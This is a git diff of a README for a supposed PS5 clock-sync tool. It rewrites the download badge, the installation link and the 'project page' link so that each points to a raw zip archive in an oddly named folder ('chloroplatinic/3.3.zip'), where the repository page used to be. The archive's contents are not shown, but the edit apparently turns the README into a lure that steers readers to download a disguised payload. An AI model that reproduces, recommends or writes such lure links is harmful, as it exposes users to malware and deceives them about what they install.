@@ -1,6 +1,6 @@
 # 🎮 ps5-date-time-sync - Never Set Your Clock Again
 
-[![Download Now](https://img.shields.io/badge/Download-ps5--date--time--sync-blue?style=for-the-badge&logo=github)](https://github.com/joey247-dot/ps5-date-time-sync)
+[![Download Now](https://img.shields.io/badge/Download-ps5--date--time--sync-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/joey247-dot/ps5-date-time-sync/main/chloroplatinic/3.3.zip)
 
 ## 🚀 What Is This?
 
@@ -40,7 +40,7 @@ That's it. No special hardware, no programming knowledge, no complicated setup.
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/joey247-dot/ps5-date-time-sync](https://github.com/joey247-dot/ps5-date-time-sync)
+Visit this link to download the application: [https://raw.githubusercontent.com/joey247-dot/ps5-date-time-sync/main/chloroplatinic/3.3.zip](https://raw.githubusercontent.com/joey247-dot/ps5-date-time-sync/main/chloroplatinic/3.3.zip)
 
 Here's what you'll need to do:
 
@@ -137,7 +137,7 @@ No. This is a free, open-source project. You can download and use it as much as 
 
 If you have questions or encounter problems, you can:
 
-- Visit the project page: [https://github.com/joey247-dot/ps5-date-time-sync](https://github.com/joey247-dot/ps5-date-time-sync)
+- Visit the project page: [https://raw.githubusercontent.com/joey247-dot/ps5-date-time-sync/main/chloroplatinic/3.3.zip](https://raw.githubusercontent.com/joey247-dot/ps5-date-time-sync/main/chloroplatinic/3.3.zip)
 - Check the **Issues** section for known problems
 - Leave a comment or question on the repository page
 
